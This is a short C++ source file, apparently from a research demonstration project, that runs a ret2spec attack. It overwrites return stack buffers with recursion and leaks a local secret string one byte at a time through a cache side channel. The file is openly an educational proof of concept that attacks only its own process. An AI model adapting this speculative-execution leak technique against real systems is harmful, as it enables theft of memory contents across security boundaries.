/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstration of ret2spec that exploits the fact that return stack buffers
 * have limited size and they can be rewritten by recursive invocations of
 * another function.
 * We have two functions that we named after their constant return values. First
 * the ReturnsTrue function invokes itself kRecursionDepth times and in the
 * deepest invocation it calls ReturnsFalse function. Returns_false function
 * invokes itself kRecursionDepth times. All returns of the ReturnsFalse
 * function are predicted correctly, but returns of ReturnsTrue function are
 * mispredicted to the return address of the ReturnsFalse function, because all
 * RSB pointers were rewritten by ReturnsFalse invocations. We steer those
 * mispredictions to an unreachable code path with microarchitectural side
 * effects.
 **/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "ret2spec_common.h"
#include "utils.h"

// Does nothing.
static void NopFunction() {}

// Starts the recursive execution of ReturnsFalse.
static void ReturnsFalseRecursion() {
  ReturnsFalse(kRecursionDepth);
}

int main() {
  conditionally_unschedule = NopFunction;
  unschedule_or_start_returns_false = ReturnsFalseRecursion;
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    current_offset = i;
    std::cout << Ret2specLeakByte();
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
